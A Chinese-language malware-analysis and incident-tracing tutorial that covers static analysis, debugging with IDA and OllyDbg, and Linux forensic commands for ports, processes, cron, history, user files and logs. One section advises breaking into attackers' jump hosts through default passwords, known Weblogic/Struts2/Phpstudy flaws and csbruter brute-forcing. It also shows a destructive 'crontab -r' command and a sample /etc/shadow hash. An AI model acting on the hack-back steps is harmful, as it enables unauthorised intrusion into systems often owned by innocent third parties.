\u54c8\u5e0c\u662f\u4e00\u79cd\u7528\u6765\u552f\u4e00\u6807\u8bc6\u76ee\u6807\u7a0b\u5e8f\u7684\u5e38\u7528\u65b9\u6cd5\u3002\u76ee\u6807\u7a0b\u5e8f\u901a\u8fc7\u4e00\u4e2a\u54c8\u5e0c\u7b97\u6cd5\uff0c\u4f1a\u4ea7\u751f\u51fa\u4e00\u6bb5\u552f\u4e00\u7684\u7528\u4e8e\u6807\u8bc6\u8fd9\u4e2a\u6837\u672c\u7684\u54c8\u5e0c\u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u503c\u7406\u89e3\u4e3a\u662f\u76ee\u6807\u7a0b\u5e8f\u7684\u6307\u7eb9\u3002\u5e38\u7528\u7684\u54c8\u5e0c\u7b97\u6cd5\u6709MD5\u3001Sha-1\u4ee5\u53caCRC32\u7b49\u3002\u7531\u4e8e\u4ec5\u4ec5\u91c7\u7528\u4e00\u79cd\u7b97\u6cd5\uff0c\u7279\u522b\u662fMD5\u7b97\u6cd5\uff0c\u6709\u53ef\u80fd\u4f7f\u5f97\u4e0d\u540c\u7a0b\u5e8f\u4ea7\u751f\u540c\u6837\u7684\u54c8\u5e0c\u7ed3\u679c\uff0c\u6240\u4ee5\u4e00\u822c\u4f1a\u8fd0\u7528\u591a\u79cd\u54c8\u5e0c\u9a8c\u8bc1\u6587\u4ef6\u7684\u552f\u4e00\u6027\u3002 \u67e5\u627e\u5b57\u7b26\u4e32 \u00b6 \u7a0b\u5e8f\u4e2d\u7684\u5b57\u7b26\u4e32\u5c31\u662f\u4e00\u4e32\u53ef\u6253\u5370\u7684\u5b57\u7b26\u5e8f\u5217\uff0c\u4e00\u4e2a\u7a0b\u5e8f\u901a\u5e38\u90fd\u4f1a\u5305\u542b\u4e00\u4e9b\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982\u6253\u5370\u8f93\u51fa\u4fe1\u606f\u3001\u8fde\u63a5\u7684URL\uff0c\u6216\u8005\u662f\u7a0b\u5e8f\u6240\u8c03\u7528\u7684API\u51fd\u6570\u7b49\u3002\u4ece\u5b57\u7b26\u4e32\u4e2d\u8fdb\u884c\u641c\u7d22\u662f\u83b7\u53d6\u7a0b\u5e8f\u529f\u80fd\u63d0\u793a\u7684\u4e00\u79cd\u7b80\u5355\u65b9\u6cd5\u3002\uff08\u5728IDA\u548cOD\u4e2d\u90fd\u53ef\u4ee5\u67e5\u627e\u5b57\u7b26\u4e32\uff09\u5e76\u4e0d\u662f\u6240\u6709\u7684\u5b57\u7b26\u4e32\u90fd\u662f\u6709\u610f\u4e49\u7684\uff0c\u4f46\u662f\u5229\u7528\u8fd9\u4e2a\u7ed3\u679c\uff0c\u4e5f\u80fd\u591f\u7ed9\u6211\u4eec\u7684\u9759\u6001\u5206\u6790\u5e26\u6765\u5f88\u5927\u7684\u4fbf\u5229\u4e86\u3002 \u67e5\u627e\u5bfc\u5165\u51fd\u6570 \u00b6 \u5982\u679c\u8f6f\u4ef6\u88ab\u52a0\u58f3\u7684\u8bdd\uff0c\u90a3\u4e48\u5bfc\u5165\u8868\u4e2d\u7684\u51fd\u6570\u4f1a\u5f88\u5c11\uff0c\u6240\u4ee5\u53ef\u4ee5\u4ece\u8fd9\u91cc\u5224\u65ad\u6587\u4ef6\u662f\u5426\u88ab\u52a0\u58f3\u3002\u5982\u679c\u6ca1\u6709\u52a0\u58f3\uff0c\u90a3\u4e48\u5bfc\u5165\u8868\u4e2d\u4f1a\u5217\u51fa\u7a0b\u5e8f\u4f7f\u7528\u7684\u5927\u90e8\u5206\u51fd\u6570\uff08\u9664\u53bb\u7a0b\u5e8f\u52a8\u6001\u83b7\u5f97\u7684\uff09\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u51fd\u6570\u5927\u81f4\u5224\u65ad\u4e00\u4e0b\u7a0b\u5e8f\u7684\u884c\u4e3a\u3002 \u89e3\u6790\u5b8f \u00b6 \u4f7f\u7528IDA\u53cd\u6c47\u7f16\u7a0b\u5e8f\u7684\u65f6\u5019\uff0cIDA\u5e76\u4e0d\u4f1a\u5c06\u5b8f\u7684\u540d\u5b57\u89e3\u6790\u51fa\u6765\uff0c\u76f8\u53cd\uff0c\u5b83\u53ea\u4f1a\u4f7f\u7528\u5b8f\u5bf9\u5e94\u7684\u6570\u5b57\u8fdb\u884c\u663e\u793a\uff0c\u5982\u4e0b\u5982\u6240\u793a\uff1a \u5982\u679c\u53ea\u770b\u8fd9\u4e9b\u6570\u5b57\uff0c\u5b8c\u5168\u65e0\u6cd5\u5f97\u77e5\u4ec0\u4e48\u60c5\u51b5\uff0c\u597d\u5728IDA\u63d0\u4f9b\u4e86\u89e3\u6790\u673a\u5236\uff0c\u53ef\u4ee5\u5c06\u6570\u5b57\u8f6c\u6362\u4e3a\u5b8f\u540d\u3002\u5728\u5bf9\u5e94\u7684\u6570\u5b57\u4e0a\u53f3\u952e\uff0c\u9009\u62e9Enum\uff1a \u7136\u540e\u5728\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\u4e2d\u9009\u62e9\u5bf9\u5e94\u7684\u5b8f\u5373\u53ef \u66ff\u6362\u540e\u7684\u7ed3\u679c\u5982\u4e0b\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u65b9\u4fbf\u4e86\u9759\u6001\u67e5\u770b\u4ee3\u7801 \u4fa6\u58f3\u64cd\u4f5c \u00b6 \u75c5\u6bd2\u6728\u9a6c\u7f16\u5199\u8005\u7ecf\u5e38\u4f1a\u4f7f\u7528\u52a0\u58f3\u6280\u672f\u6765\u8ba9\u4ed6\u4eec\u7684\u6076\u610f\u7a0b\u5e8f\u96be\u4ee5\u88ab\u68c0\u6d4b\u6216\u5206\u6790\u3002\u6b63\u5e38\u7684\u7a0b\u5e8f\u603b\u662f\u4f1a\u5305\u542b\u5f88\u591a\u5b57\u7b26\u4e32\u3002\u800c\u52a0\u4e86\u58f3\u7684\u6076\u610f\u4ee3\u7801\u901a\u8fc7\u5206\u6790\u6240\u5f97\u5230\u7684\u53ef\u6253\u5370\u5b57\u7b26\u4e32\u5c31\u4f1a\u5f88\u5c11\u3002\u5982\u679c\u67e5\u627e\u51fa\u7684\u7a0b\u5e8f\u7684\u5b57\u7b26\u4e32\u5f88\u5c11\u65f6\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7a0b\u5e8f\u5c31\u5f88\u6709\u53ef\u80fd\u662f\u52a0\u4e86\u58f3\u7684\u3002\u6b64\u65f6\u5f80\u5f80\u5c31\u9700\u8981\u4f7f\u7528\u5176\u5b83\u65b9\u6cd5\u6765\u8fdb\u4e00\u6b65\u68c0\u6d4b\u5b83\u4eec\u7684\u884c\u4e3a\u3002(\u5e38\u7528PEiD\u8fdb\u884c\u67e5\u58f3) \u52a8\u6001\u8c03\u8bd5 \u00b6 \u4f7f\u7528\u8c03\u8bd5\u5668\u5bf9\u75c5\u6bd2\u8fdb\u884c\u5206\u6790\u5728\u53cd\u75c5\u6bd2\u5de5\u4f5c\u4e2d\u626e\u6f14\u7740\u5341\u5206\u91cd\u8981\u7684\u89d2\u8272\u3002\u8c03\u8bd5\u5668\u5141\u8bb8\u4f60\u67e5\u770b\u4efb\u610f\u5185\u5b58\u5730\u5740\u7684\u5185\u5bb9\u3001\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u4ee5\u53ca\u6bcf\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u3002\u8c03\u8bd5\u5668\u4e5f\u5141\u8bb8\u4f60\u5728\u4efb\u610f\u65f6\u523b\u6539\u53d8\u5173\u4e8e\u7a0b\u5e8f\u6267\u884c\u7684\u4efb\u4f55\u4e1c\u897f\u3002\u6bd4\u5982\u4f60\u53ef\u4ee5\u5728\u4efb\u610f\u65f6\u523b\u6539\u53d8\u4e00\u4e2a\u53d8\u91cf\u7684\u503c------\u524d\u63d0\u662f\u4f60\u9700\u8981\u83b7\u5f97\u5173\u4e8e\u8fd9\u4e2a\u53d8\u91cf\u8db3\u591f\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e\u3002\u5728\u5b9e\u9645\u7684\u52a8\u6001\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\uff0c\u6700\u5e38\u7528\u7684\u662fOllyDBG\u548cWinDbg\uff0c\u524d\u8005\u662f\u75c5\u6bd2\u5206\u6790\u4eba\u5458\u4f7f\u7528\u6700\u591a\u7684\u8c03\u8bd5\u5668\uff0c\u7f3a\u70b9\u662f\u4e0d\u652f\u6301\u5185\u6838\u8c03\u8bd5\uff0c\u5982\u679c\u60f3\u8c03\u8bd5\u5185\u6838\uff0cWinDbg\u57fa\u672c\u4e0a\u5c31\u662f\u552f\u4e00\u7684\u9009\u62e9\u4e86\u3002\u867d\u7136IDA Pro\u4e5f\u80fd\u591f\u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\uff0c\u4f46\u662f\u5b83\u8fdc\u8fdc\u4e0d\u5982OD\u65b9\u4fbf\u3002\u56e0\u6b64\u5728\u5b9e\u9645\u5206\u6790\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5f80\u5f80\u662f\u5c06\u4e8c\u8005\u7ed3\u5408\u4f7f\u7528\u7684\u3002\u56e0\u4e3a\u5982\u679c\u7528IDA Pro\u5728\u9759\u6001\u5206\u6790\u4e2d\u9047\u5230\u4e86\u5341\u5206\u62bd\u8c61\u7684\u51fd\u6570\uff0c\u90a3\u4e48\u7528OD\u52a8\u6001\u5730\u6267\u884c\u4e00\u4e0b\uff0c\u8be5\u51fd\u6570\u7684\u529f\u80fd\u5f80\u5f80\u5c31\u80fd\u4e00\u76ee\u4e86\u7136\u4e86 \u591a\u7ebf\u7a0b\u8c03\u8bd5 \u00b6 D\u8c03\u8bd5\u8f6f\u4ef6\u65f6\uff0c\u5b83\u6bcf\u6b21\u53ea\u80fd\u8ddf\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u5982\u679c\u9047\u5230\u7684\u8f6f\u4ef6\u521b\u5efa\u4e86\u5f88\u591a\u7ebf\u7a0b\uff0c\u90a3\u4e48\u8c03\u8bd5\u8d77\u6765\u5c31\u6bd4\u8f83\u9ebb\u70e6\u4e86\uff0c\u672c\u8282\u4ecb\u7ecd\u4e00\u4e0b\u591a\u7ebf\u7a0b\u7684\u8c03\u8bd5\u65b9\u6cd5\u3002 \u9996\u5148\u770b\u4e00\u4e0b\u7ebf\u7a0b\u521b\u5efa\u7684\u51fd\u6570\uff1a HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes,//SD SIZE_T dwStackSize,//initialstacksize LPTHREAD_START_ROUTINE lpStartAddress,//threadfunction LPVOID lpParameter,//threadargument DWORD dwCreationFlags,//creationoption LPDWORD lpThreadId//threadidentifier ) \u91cd\u70b9\u770b\u7b2c\u4e09\u4e2a\u548c\u7b2c\u56db\u4e2a\u51fd\u6570\uff0c\u5176\u4e2d\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5b9a\u4e86\u65b0\u7ebf\u7a0b\u7684\u5165\u53e3\u5730\u5740\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u4e3a\u65b0\u7ebf\u7a0b\u6240\u9700\u7684\u53c2\u6570\uff0c\u5f53\u7a0b\u5e8f\u8c03\u7528\u6b64\u51fd\u6570\u6765\u521b\u5efa\u7ebf\u7a0b\u7684\u65f6\u5019\uff0c\u5b9a\u4f4d\u5230\u7ebf\u7a0b\u7684\u5165\u53e3\u5730\u5740\u8bbe\u7f6e\u65ad\u70b9\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7a0b\u5e8f\u4f1a\u5728\u540e\u9762\u8c03\u7528Sleep\u6216WaitForSingleObject\u51fd\u6570\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u7a0b\u5e8f\u7684\u63a7\u5236\u6743\u5c31\u5230\u4e86\u65b0\u7ebf\u7a0b\u91cc\u9762\u3002 \u5982\u679c\u7a0b\u5e8f\u6ca1\u6709\u8c03\u7528Sleep\u6216WaitForSingleObject\u51fd\u6570\uff0c\u90a3\u4e48\u53ef\u4ee5\u4fee\u6539\u51fd\u6570\u7684\u4ee3\u7801\uff0c\u5f3a\u5236\u7a0b\u5e8f\u8c03\u7528\u8fd9\u4e24\u4e2a\u51fd\u6570\uff0c\u8fd9\u6837\u7a0b\u5e8f\u5c31\u8f6c\u5230\u65b0\u7ebf\u7a0b\u4e2d\u6267\u884c\u3002\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u4fee\u6539\u7a0b\u5e8f\u7684EIP\uff0c\u4f7f\u5176\u6307\u5411\u65b0\u7ebf\u7a0b\u5165\u53e3\uff0c\u5982\u679c\u6709\u53c2\u6570\u7684\u8bdd\uff0c\u8fd8\u8981\u4fee\u6539\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u4f7f\u5176\u6307\u5411\u53c2\u6570\u5730\u5740\uff0c\u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u53ef\u80fd\u4f1a\u9020\u6210\u5bc4\u5b58\u5668\u5185\u5bb9\u4e0d\u6b63\u786e\uff0c\u73af\u5883\u5f02\u5e38\uff0c\u4ece\u800c\u9020\u6210\u7a0b\u5e8f\u6267\u884c\u5d29\u6e83\u3002 \u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u6765\u8c03\u8bd5\u591a\u7ebf\u7a0b\u3002\u5982\u679c\u7a0b\u5e8f\u591a\u6b21\u8c03\u7528CreateThread\uff0c\u786e\u5b9a\u4e00\u4e2a\u6211\u4eec\u6253\u7b97\u8c03\u8bd5\u7684\u7ebf\u7a0b\uff0c\u5e76\u8ba9\u8fd9\u4e2a\u7ebf\u7a0b\u521b\u5efa\u6210\u529f\uff0c\u5f53\u7a0b\u5e8f\u518d\u8c03\u7528CreateThread\u521b\u5efa\u7ebf\u7a0b\u7684\u65f6\u5019\uff0c\u76f4\u63a5\u4fee\u6539\u6b64\u51fd\u6570\uff0c\u8ba9\u5b83\u76f4\u63a5\u8fd4\u56de\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u518d\u521b\u5efa\u7ebf\u7a0b\u4e86\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u53ea\u8c03\u8bd5\u4e00\u4e2a\u7ebf\u7a0b\u3002 \u8c03\u8bd5\u5b50\u8fdb\u7a0b \u00b6 \u6709\u4e9b\u6837\u672c\u5e76\u4e0d\u662f\u5355\u72ec\u8fd0\u884c\u7684\uff0c\u5b83\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u4f1a\u521b\u5efa\u5b50\u8fdb\u7a0b\u6765\u5b8c\u6210\u6076\u610f\u529f\u80fd\uff0c\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\uff0c\u5c31\u9700\u8981\u8fdb\u5165\u5b50\u8fdb\u7a0b\u4e2d\u8fdb\u884c\u8c03\u8bd5\u3002 \u5982\u679c\u7236\u8fdb\u7a0b\u521b\u5efa\u5b50\u8fdb\u7a0b\u65f6\u662f\u4ee5suspended\u7684\u65b9\u5f0f\u521b\u5efa\u7684\uff0c\u90a3\u4e48\u7236\u8fdb\u7a0b\u4f1a\u5411\u5b50\u8fdb\u7a0b\u8fdb\u884c\u4ee3\u7801\u6ce8\u5165\uff0c\u5199\u5165\u4e4b\u540e\u4f1a\u8c03\u7528ResumeThread\u51fd\u6570\u6062\u590d\u5b50\u8fdb\u7a0b\u7684\u8fd0\u884c\u3002\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u786e\u5b9a\u7236\u8fdb\u7a0b\u5199\u5165\u4ee3\u7801\u7684\u5730\u5740\uff0c\u5f53\u4ee3\u7801\u5199\u5165\u4e4b\u540e\uff0c\u8c03\u7528ResumeThread\u6062\u590d\u5b50\u8fdb\u7a0b\u8fd0\u884c\u524d\uff0c\u9644\u52a0\u5230\u5b50\u8fdb\u7a0b\u4e2d\uff0c\u5728\u4ee3\u7801\u6ce8\u5165\u7684\u5730\u5740\u4e0b\u65ad\u70b9\u5e76F9\u8ba9\u5b50\u8fdb\u7a0b\u8fd0\u884c\u3002\u8fd9\u65f6\u518d\u56de\u5230\u7236\u8fdb\u7a0b\u4e2d\uff0c\u8fd0\u884c\u51fd\u6570ResumeThread\uff0c\u8fd9\u6837\u5b50\u8fdb\u7a0b\u5c31\u53ef\u4ee5\u65ad\u5728\u4ee3\u7801\u6ce8\u5165\u7684\u5730\u5740\u4e86\u3002 \u8fd8\u6709\u4e00\u79cd\u521b\u5efa\u5b50\u8fdb\u7a0b\u7684\u65b9\u5f0f\uff0c\u5c31\u53ea\u662f\u7b80\u5355\u7684\u5f00\u542f\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u8fd0\u884c\uff0c\u8fd9\u79cd\u60c5\u51b5\u6bd4\u8f83\u7b80\u5355\uff0c\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u5c31\u662f\u7236\u8fdb\u7a0b\u521b\u5efa\u5b50\u8fdb\u7a0b\u65f6\u4f20\u7ed9\u5b50\u8fdb\u7a0b\u7684\u53c2\u6570\uff0c\u4f7f\u7528OD\u6253\u5f00\u8981\u8fd0\u884c\u7684\u5b50\u8fdb\u7a0b\uff0c\u4f20\u5165\u6240\u9700\u7684\u53c2\u6570\u5373\u53ef\u5f00\u59cb\u8c03\u8bd5\u3002 \u8df3\u677f\u673a \u00b6 \u672c\u8282\u8fdb\u884c\u8df3\u677f\u673a\u4e0a\u4fe1\u606f\u641c\u96c6\uff0c\u67e5\u770b\u8df3\u677f\u673a\u662f\u88ab\u54ea\u4e2aIP\u5165\u4fb5\u7684\uff0c\u662f\u5426\u7559\u4e0b\u4e00\u4e9b\u9ed1\u5ba2\u5de5\u5177\u5e26\u6709\u4e2a\u4eba\u6216\u7ec4\u7ec7\u4fe1\u606f\uff0c\u7ee7\u7eed\u5411\u4e0a\u6eaf\u6e90 \u672c\u8282\u9700\u8981\u6eaf\u6e90\u4eba\u5458\u5bf9linux\u53cawindows\u7cfb\u7edf\u547d\u4ee4\u6709\u4e00\u5b9a\u638c\u63e1\u3002 \u5173\u4e8e\u5982\u4f55\u653b\u7834\u8df3\u677f\u673a \u4e00\u822c\u8df3\u677f\u673a\u5927\u591a\u6570\u4e3a\u9ed1\u5ba2\u7684\u5168\u7f51\u6f0f\u6d1e\u626b\u63cf\u811a\u672c\u6279\u91cf\u653b\u51fb\u62ff\u4e0b\u7684\u8089\u9e21\uff0c\u6545\u5176\u6bd4\u8f83\u5bb9\u6613\u62ff\u4e0b\u3002\u4e0d\u6392\u9664\u9ed1\u5ba2\u901a\u8fc7\u5b9a\u70b9\u3001\u624b\u52a8\u653b\u51fb\u3001\u8d2d\u4e70\u7b49\u9014\u5f84\u83b7\u5f97\u7684\u8df3\u677f\u673a\u3002 \u8fdb\u884c\u5168\u7aef\u53e3\u63a2\u6d4b,\u5c1d\u8bd5\u9ed8\u8ba4\u5bc6\u7801\u3001\u627eWeb\u670d\u52a1\u8fdb\u884c\u653b\u51fb\u3002 \u4e00\u4e9b\u5f71\u54cd\u8303\u56f4\u5e7f\u6cdb\u3001\u5229\u7528\u7b80\u5355\u7684\u6f0f\u6d1e \u5982\uff1aPhpstudy\u540e\u95e8\u3001Weblogic\u6f0f\u6d1e\u3001Struts2\u6f0f\u6d1e\u3001\u8def\u7531\u5668\u76d1\u63a7\u6444\u50cf\u5668\u7b49\u7ec8\u7aef\u6f0f\u6d1e\u3002 \u9047\u5230CS server\u53ef\u901a\u8fc7csbruter\u5de5\u5177\u7206\u7834\u5bc6\u7801\u3002 \u5e38\u89c1\u7684\u65e5\u5fd7\u5206\u6790\u5de5\u5177\uff1a windows\uff1alogparser linux\uff1a\u4e3b\u8981\u4e3a\u4e00\u4e9b\u547d\u4ee4\u7684\u4f7f\u7528\u4f8b\uff1asplit sed cat sort uniq awk\u7b49 \u8df3\u677f\u673a\u7684\u6eaf\u6e90\u8fc7\u7a0b\uff0c\u53ef\u4ee5\u4e3b\u8981\u4ece\u7aef\u53e3\u3001\u8fdb\u7a0b\u3001\u5b9a\u65f6\u4efb\u52a1\u3001\u65e5\u5fd7\u6765\u5165\u624b Linux \u00b6 \u7aef\u53e3\u67e5\u8be2 \u00b6 \u4f7f\u7528 netstat \u7f51\u7edc\u8fde\u63a5\u547d\u4ee4\uff0c\u5206\u6790\u53ef\u7591\u7aef\u53e3\u3001IP\u3001PID \u90e8\u5206\u7cfb\u7edf\u53ef\u4f7f\u7528lsof -i \u67e5\u770b\u4e0b pid \u6240\u5bf9\u5e94\u7684\u8fdb\u7a0b\u6587\u4ef6\u8def\u5f84\uff0c \u8fd0\u884c ls -l /proc/$PID/exe \u6216 file /proc/$PID/exe\uff08$PID \u4e3a\u5bf9\u5e94\u7684 pid \u53f7\uff09 \u8fdb\u7a0b\u67e5\u8be2 \u00b6 \u4f7f\u7528 ps \u547d\u4ee4\uff0c\u5206\u6790\u8fdb\u7a0b ps aux | grep pid \u5b9a\u65f6\u4efb\u52a1 \u00b6 1\u3001\u5229\u7528 crontab \u67e5\u8be2\u521b\u5efa\u7684\u5b9a\u65f6\u4efb\u52a1 \u57fa\u672c\u547d\u4ee4 crontab -l \u5217\u51fa\u67d0\u4e2a\u7528\u6237cron\u670d\u52a1\u7684\u8be6\u7ec6\u5185\u5bb9 Tips\uff1a\u9ed8\u8ba4\u7f16\u5199\u7684crontab\u6587\u4ef6\u4f1a\u4fdd\u5b58\u5728 (/var/spool/cron/\u7528\u6237\u540d \u4f8b\u5982: /var/spool/cron/root crontab -r \u5220\u9664\u6bcf\u4e2a\u7528\u6237cront\u4efb\u52a1(\u8c28\u614e\uff1a\u5220\u9664\u6240\u6709\u7684\u8ba1\u5212\u4efb\u52a1) crontab -e \u4f7f\u7528\u7f16\u8f91\u5668\u7f16\u8f91\u5f53\u524d\u7684crontab\u6587\u4ef6 \u5982\uff1a*/1 * * * * echo \\\"hello world\\\" >> /tmp/test.txt \u6bcf\u5206\u949f\u5199\u5165\u6587\u4ef6 2\u3001\u5229\u7528 anacron \u547d\u4ee4\u5b9e\u73b0\u5f02\u6b65\u5b9a\u65f6\u4efb\u52a1\u8c03\u5ea6 \u4f7f\u7528\u6848\u4f8b \u6bcf\u5929\u8fd0\u884c /home/backup.sh \u811a\u672c\uff1a vi /etc/anacrontab \\@daily 10 example.daily /bin/bash /home/backup.sh \u5f53\u673a\u5668\u5728 backup.sh \u671f\u671b\u88ab\u8fd0\u884c\u65f6\u662f\u5173\u673a\u7684\uff0canacron\u4f1a\u5728\u673a\u5668\u5f00\u673a\u5341\u5206\u949f\u4e4b\u540e\u8fd0\u884c\u5b83\uff0c\u800c\u4e0d\u7528\u518d\u7b49\u5f85 7\u5929\u3002 \u5386\u53f2\u547d\u4ee4 \u00b6 1\u3001root \u7528\u6237\u7684\u5386\u53f2\u547d\u4ee4 histroy 2\u3001\u6253\u5f00 /home \u5404\u5e10\u53f7\u76ee\u5f55\u4e0b\u7684 .bash_history\uff0c\u67e5\u770b\u666e\u901a\u5e10\u53f7\u6267\u884c\u7684\u5386\u53f2\u547d\u4ee4\u3002 \u4e3a\u5386\u53f2\u7684\u547d\u4ee4\u589e\u52a0\u767b\u5f55\u7684 IP \u5730\u5740\u3001\u6267\u884c\u547d\u4ee4\u65f6\u95f4\u7b49\u4fe1\u606f\uff1a 1\uff09\u4fdd\u5b581\u4e07\u6761\u547d\u4ee4 sed -i \\'s/^HISTSIZE=1000/HISTSIZE=10000/g\\' /etc/profile 2\uff09\u5728/etc/profile\u7684\u6587\u4ef6\u5c3e\u90e8\u6dfb\u52a0\u5982\u4e0b\u884c\u6570\u914d\u7f6e\u4fe1\u606f\uff1a USER_IP=`who -u am i 2>/dev/null | awk \\'{print $NF}\\' | sed -e \\'s/[()]//g\\'` if [ \\\"$USER_IP\\\" = \\\"\\\" ] then USER_IP=`hostname` fi export HISTTIMEFORMAT=\\\"%F %T $USER_IP `whoami` \\\" shopt -s histappend export PROMPT_COMMAND=\\\"history -a\\\" 3\uff09source /etc/profile \u8ba9\u914d\u7f6e\u751f\u6548 \u7528\u6237 \u00b6 who \u67e5\u770b\u5f53\u524d\u767b\u5f55\u7528\u6237\uff08tty \u672c\u5730\u767b\u9646 pts \u8fdc\u7a0b\u767b\u5f55\uff09 w \u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\uff0c\u60f3\u77e5\u9053\u67d0\u4e00\u65f6\u523b\u7528\u6237\u7684\u884c\u4e3a uptime \u67e5\u770b\u767b\u9646\u591a\u4e45\u3001\u591a\u5c11\u7528\u6237\uff0c\u8d1f\u8f7d\u72b6\u6001 1\u3001\u7528\u6237\u4fe1\u606f\u6587\u4ef6 /etc/passwd root 0:0:root:/root:/bin/bash account:password:UID:GID:GECOS:directory:shell \u7528\u6237\u540d\uff1a\u5bc6\u7801\uff1a\u7528\u6237ID\uff1a\u7ec4ID\uff1a\u7528\u6237\u8bf4\u660e\uff1a\u5bb6\u76ee\u5f55\uff1a\u767b\u9646\u4e4b\u540e\u7684 shell \u6ce8\u610f\uff1a\u65e0\u5bc6\u7801\u53ea\u5141\u8bb8\u672c\u673a\u767b\u9646\uff0c\u8fdc\u7a0b\u4e0d\u5141\u8bb8\u767b\u9646 2\u3001\u5f71\u5b50\u6587\u4ef6 /etc/shadow\u6bcf\u4e2a:\u4e3a\u4e00\u6b21\u5206\u5272 root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: \u7528\u6237\u540d\uff1a\u52a0\u5bc6\u5bc6\u7801\uff1a\u5bc6\u7801\u6700\u540e\u4e00\u6b21\u4fee\u6539\u65e5\u671f\uff1a\u4e24\u6b21\u5bc6\u7801\u7684\u4fee\u6539\u65f6\u95f4\u95f4\u9694\uff1a\u5bc6\u7801\u6709\u6548\u671f\uff1a\u5bc6\u7801\u4fee\u6539\u5230\u671f\u5230\u7684\u8b66\u544a\u5929\u6570\uff1a\u5bc6\u7801\u8fc7\u671f\u4e4b\u540e\u7684\u5bbd\u9650\u5929\u6570\uff1a\u8d26\u53f7\u5931\u6548\u65f6\u95f4\uff1a\u4fdd\u7559 \u65e5\u5fd7 \u00b6 \u65e5\u5fd7\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\uff1a/var/log \u65e5\u5fd7\u6587\u4ef6 \u8bf4\u660e /var/log/cron \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7 /var/log/cups \u8bb0\u5f55\u6253\u5370\u4fe1\u606f\u7684\u65e5\u5fd7 /var/log/dmesg \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5728\u5f00\u673a\u65f6\u5185\u6838\u81ea\u68c0\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528dmesg\u547d\u4ee4\u76f4\u63a5\u67e5\u770b\u5185\u6838\u81ea\u68c0\u4fe1\u606f /var/log/mailog \u8bb0\u5f55\u90ae\u4ef6\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u91cd\u8981\u4fe1\u606f\u7684\u65e5\u5fd7\u3002\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d\u4f1a\u8bb0\u5f55Linux\u7cfb\u7edf\u7684\u7edd\u5927\u591a\u6570\u91cd\u8981\u4fe1\u606f\uff0c\u5982\u679c\u7cfb\u7edf\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u9996\u5148\u8981\u68c0\u67e5\u7684\u5c31\u5e94\u8be5\u662f\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6 /var/log/btmp \u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\u67e5\u770b\uff0c\u800c\u8981\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u6c38\u4e45\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u540c\u65f6\u8bb0\u5f55\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u91cd\u542f\u3001\u5173\u673a\u4e8b\u4ef6\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e5f\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u9700\u8981\u4f7f\u7528last\u547d\u4ee4\u6765\u67e5\u770b /var/log/utmp 